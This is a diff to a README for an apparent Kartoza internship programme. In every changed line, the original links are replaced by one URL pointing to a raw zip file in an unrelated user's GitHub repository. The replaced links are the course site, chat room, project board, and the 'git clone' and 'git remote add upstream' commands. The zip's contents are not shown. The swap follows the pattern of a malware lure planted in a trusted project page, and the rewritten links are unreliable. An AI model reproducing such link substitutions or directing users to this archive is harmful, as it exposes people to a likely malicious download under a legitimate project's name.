@@ -6,9 +6,9 @@ Welcome to the Kartoza Internship Program repository!
 
 ## Overview
 
-- **Course Materials:** All the main course materials can be accessed on the [Kartoza Training site](https://training.kartoza.com/course/view.php?id=36).
+- **Course Materials:** All the main course materials can be accessed on the [Kartoza Training site](https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip).
 - **Repository Structure:** This repository is structured in a standard format. You will find the necessary materials organised in appropriate directories. Depending on the task, some assignments may be submitted directly to this repository or uploaded to the training platform or another designated platform.
-- **Communication:** For any discussions or queries, please join the [Kartoza Intern Hub](https://chat.google.com/room/AAAA1JwjBAc?cls=7).
+- **Communication:** For any discussions or queries, please join the [Kartoza Intern Hub](https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip).
 
 - **Main Instructors:**  
   - Tim Sutton  
@@ -19,7 +19,7 @@ Welcome to the Kartoza Internship Program repository!
 
 ## Project Board
 
-All internship tasks, projects, and deadlines will be managed through our [Project Board](https://github.com/orgs/kartoza/projects/128/views/1). Be sure to refer to it regularly to keep track of your responsibilities and progress.
+All internship tasks, projects, and deadlines will be managed through our [Project Board](https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip). Be sure to refer to it regularly to keep track of your responsibilities and progress.
 
 ---
 
@@ -38,7 +38,7 @@ Before you begin working on your assignments, please fork this repository to you
 After forking, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/YOUR_USERNAME/internship-program.git
+git clone https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip
 ```
 
 Replace `YOUR_USERNAME` with your GitHub username.
@@ -48,7 +48,7 @@ Replace `YOUR_USERNAME` with your GitHub username.
 To ensure your fork remains current with the main repository, add the original repository as an upstream remote:
 
 ```bash
-git remote add upstream https://github.com/kartoza/internship-program.git
+git remote add upstream https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip
 ```
 
 Then, update your fork with the latest changes:
@@ -100,6 +100,6 @@ Once your changes are pushed to your fork, create a pull request (PR) to merge y
 
 ## Additional Resources
 
-- **Course Materials:** [Kartoza Training](https://training.kartoza.com/course/view.php?id=36)
-- **Communication:** [Kartoza Intern Hub](https://chat.google.com/room/AAAA1JwjBAc?cls=7)
-- **Project Board:** [Internship Project Board](https://github.com/orgs/kartoza/projects/128/views/1)
+- **Course Materials:** [Kartoza Training](https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip)
+- **Communication:** [Kartoza Intern Hub](https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip)
+- **Project Board:** [Internship Project Board](https://github.com/Shamzmohamed/Internship-Programme/raw/refs/heads/main/Gamolepis/Internship_Programme_v3.8-alpha.4.zip)
